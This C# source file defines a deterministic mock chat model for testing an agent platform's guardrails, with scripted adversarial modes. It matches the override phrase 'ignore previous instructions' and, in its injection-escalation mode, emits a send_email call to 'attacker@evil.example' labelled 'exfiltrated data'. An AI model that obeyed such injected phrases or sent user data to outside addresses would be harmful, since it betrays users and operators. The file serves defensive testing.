using System.Text;
using AgentPlatform.Application.Abstractions;
using AgentPlatform.Domain.Models;

namespace AgentPlatform.Infrastructure.Models;

/// <summary>Scripted behaviours the mock can exhibit, used to test the platform's guardrails.</summary>
public enum MockBehavior
{
    Normal,
    MalformedArguments,
    HallucinatedTool,
    UnauthorisedTool,
    InjectionEscalation,
    Loop,
    Refusal,
    Timeout,
    OversizedOutput,
}

/// <summary>
/// The default, offline model. It is <b>not</b> a stub: it reads the conversation and the tools on
/// offer and emits realistic tool calls and final answers for the seeded workflows, deterministically
/// (identical output for identical input). It can also be steered — by a per-run marker in the
/// conversation or a constructor default — into adversarial behaviours (malformed arguments,
/// hallucinated/unauthorised tool names, prompt-injection escalation, loops, refusal, timeout,
/// oversized output) so the platform's defences can be proven in tests. No network, no randomness.
/// </summary>
public sealed class DeterministicMockModel : IChatModel
{
    private readonly MockBehavior _default;

    public DeterministicMockModel(MockBehavior defaultBehavior = MockBehavior.Normal) => _default = defaultBehavior;

    public string ModelId => "mock-deterministic-v1";

    public async Task<ChatCompletion> CompleteAsync(ChatRequest request, CancellationToken cancellationToken)
    {
        var conversation = Concatenate(request);
        var behavior = DetectBehavior(conversation);

        switch (behavior)
        {
            case MockBehavior.Timeout:
                await Task.Delay(Timeout.Infinite, cancellationToken);
                break; // unreachable; cancellation throws

            case MockBehavior.Refusal:
                return Final(request, "I must decline this request as it falls outside my authorised scope.", FinishReason.Refusal);

            case MockBehavior.OversizedOutput:
                return new ChatCompletion
                {
                    Content = new string('x', 4000),
                    FinishReason = FinishReason.Stop,
                    ModelId = ModelId,
                    Usage = new TokenUsage(PromptTokens(conversation), 5_000_000),
                };

            case MockBehavior.MalformedArguments:
                return ToolCallCompletion(request, conversation, FirstToolName(request) ?? "calculate", "{ this is : not valid json ", "malformed");

            case MockBehavior.HallucinatedTool:
                return ToolCallCompletion(request, conversation, "definitely_not_a_registered_tool", "{}", "hallucinated");

            case MockBehavior.UnauthorisedTool:
                return UnauthorisedOrFinal(request, conversation, "send_email",
                    "{\"to\":\"ops@example.test\",\"subject\":\"x\",\"body\":\"y\"}");

            case MockBehavior.InjectionEscalation:
                return UnauthorisedOrFinal(request, conversation, "send_email",
                    "{\"to\":\"attacker@evil.example\",\"subject\":\"exfiltrated data\",\"body\":\"secrets\"}");

            case MockBehavior.Loop:
                // Always the same call with identical arguments — trips the oscillation detector.
                return ToolCallCompletion(request, conversation, FirstToolName(request) ?? "search_knowledge_base",
                    "{\"query\":\"stuck in a loop\"}", "loop", stableId: true);
        }

        return HappyPath(request, conversation);
    }

    // ---------------------------------------------------------------- happy path

    private ChatCompletion HappyPath(ChatRequest request, string conversation)
    {
        var available = request.Tools.Select(t => t.Name).ToList();
        var alreadyCalled = PriorToolCalls(request);
        var pending = available.FirstOrDefault(t => !alreadyCalled.Contains(t));

        if (pending is not null)
        {
            var args = BuildArguments(pending, request);
            return ToolCallCompletion(request, conversation, pending, args, "step");
        }

        return Final(request, FinalAnswer(request, conversation), FinishReason.Stop);
    }

    private static string BuildArguments(string toolName, ChatRequest request)
    {
        var userText = LastUserText(request);
        return toolName switch
        {
            "search_knowledge_base" => $"{{\"query\":{Json(FirstWords(userText, 8))},\"top_k\":3}}",
            "summarise_document" => $"{{\"text\":{Json(Truncate(userText, 8000))},\"max_sentences\":3}}",
            "calculate" => "{\"expression\":\"1+1\"}",
            _ => "{}",
        };
    }

    private static string FinalAnswer(ChatRequest request, string conversation)
    {
        var intent = request.WorkflowIntent ?? string.Empty;
        if (intent.Contains("triage", StringComparison.OrdinalIgnoreCase))
            return ClassifyTriage(AllUserText(request));
        if (intent.Contains("summar", StringComparison.OrdinalIgnoreCase))
            return "Document summarised; structured fields extracted deterministically downstream.";
        return "Task complete.";
    }

    private static string ClassifyTriage(string ticketText)
    {
        var text = ticketText.ToLowerInvariant();
        string[] escalate = { "angry", "legal", "lawsuit", "urgent", "manager", "fraud", "chargeback", "gdpr", "escalate" };
        if (escalate.Any(text.Contains)) return "escalate";
        return "auto_resolve";
    }

    // ---------------------------------------------------------------- completions

    private ChatCompletion ToolCallCompletion(ChatRequest request, string conversation, string tool, string argumentsJson, string tag, bool stableId = false)
    {
        var id = stableId ? $"call-{tool}" : $"call-{tool}-{PriorToolCalls(request).Count}";
        var call = new ModelToolCall(id, tool, argumentsJson);
        return new ChatCompletion
        {
            ToolCalls = new[] { call },
            FinishReason = FinishReason.ToolCalls,
            ModelId = ModelId,
            Usage = new TokenUsage(PromptTokens(conversation), 20 + argumentsJson.Length / 4),
        };
    }

    private ChatCompletion UnauthorisedOrFinal(ChatRequest request, string conversation, string tool, string argumentsJson)
    {
        // If we already attempted the blocked tool and saw the rejection, stop and escalate cleanly.
        if (SawBlockedToolResult(request, tool))
            return Final(request, "escalate", FinishReason.Stop);
        return ToolCallCompletion(request, conversation, tool, argumentsJson, "unauthorised");
    }

    private ChatCompletion Final(ChatRequest request, string content, FinishReason reason) => new()
    {
        Content = content,
        FinishReason = reason,
        ModelId = ModelId,
        Usage = new TokenUsage(PromptTokens(Concatenate(request)), 10 + content.Length / 4),
    };

    // ---------------------------------------------------------------- helpers

    private MockBehavior DetectBehavior(string conversation)
    {
        var text = conversation.ToLowerInvariant();
        if (text.Contains("[[mock:timeout]]")) return MockBehavior.Timeout;
        if (text.Contains("[[mock:refuse]]")) return MockBehavior.Refusal;
        if (text.Contains("[[mock:oversized]]")) return MockBehavior.OversizedOutput;
        if (text.Contains("[[mock:malformed]]")) return MockBehavior.MalformedArguments;
        if (text.Contains("[[mock:hallucinate]]")) return MockBehavior.HallucinatedTool;
        if (text.Contains("[[mock:unauthorised]]") || text.Contains("[[mock:unauthorized]]")) return MockBehavior.UnauthorisedTool;
        if (text.Contains("[[mock:loop]]")) return MockBehavior.Loop;
        if (text.Contains("ignore previous instructions") || text.Contains("[[mock:inject]]")) return MockBehavior.InjectionEscalation;
        return _default;
    }

    private static string Concatenate(ChatRequest request)
    {
        var sb = new StringBuilder();
        foreach (var message in request.Messages)
        {
            if (message.Content is not null) sb.Append(message.Content).Append('\n');
            foreach (var call in message.ToolCalls) sb.Append(call.ToolName).Append(' ').Append(call.ArgumentsJson).Append('\n');
        }
        return sb.ToString();
    }

    private static HashSet<string> PriorToolCalls(ChatRequest request)
    {
        var set = new HashSet<string>(StringComparer.Ordinal);
        foreach (var message in request.Messages)
            foreach (var call in message.ToolCalls)
                set.Add(call.ToolName);
        return set;
    }

    private static bool SawBlockedToolResult(ChatRequest request, string tool)
    {
        foreach (var message in request.Messages)
            if (message.Role == ChatRole.Tool && string.Equals(message.Name, tool, StringComparison.Ordinal)
                && message.Content is not null && message.Content.Contains("\"error\"", StringComparison.Ordinal))
                return true;
        return false;
    }

    private static string? FirstToolName(ChatRequest request) => request.Tools.Count > 0 ? request.Tools[0].Name : null;

    private static string LastUserText(ChatRequest request)
    {
        for (var i = request.Messages.Count - 1; i >= 0; i--)
            if (request.Messages[i].Role == ChatRole.User && request.Messages[i].Content is not null)
                return request.Messages[i].Content!;
        return "Proceed.";
    }

    private static string AllUserText(ChatRequest request)
    {
        var sb = new StringBuilder();
        foreach (var message in request.Messages)
            if (message.Role == ChatRole.User && message.Content is not null)
                sb.Append(message.Content).Append('\n');
        return sb.Length == 0 ? "Proceed." : sb.ToString();
    }

    private static int PromptTokens(string conversation) => Math.Max(1, conversation.Length / 4);

    private static string FirstWords(string text, int count) =>
        string.Join(' ', text.Split(' ', StringSplitOptions.RemoveEmptyEntries).Take(count));

    private static string Truncate(string text, int max) => text.Length <= max ? text : text[..max];

    private static string Json(string value) => System.Text.Json.JsonSerializer.Serialize(value);
}
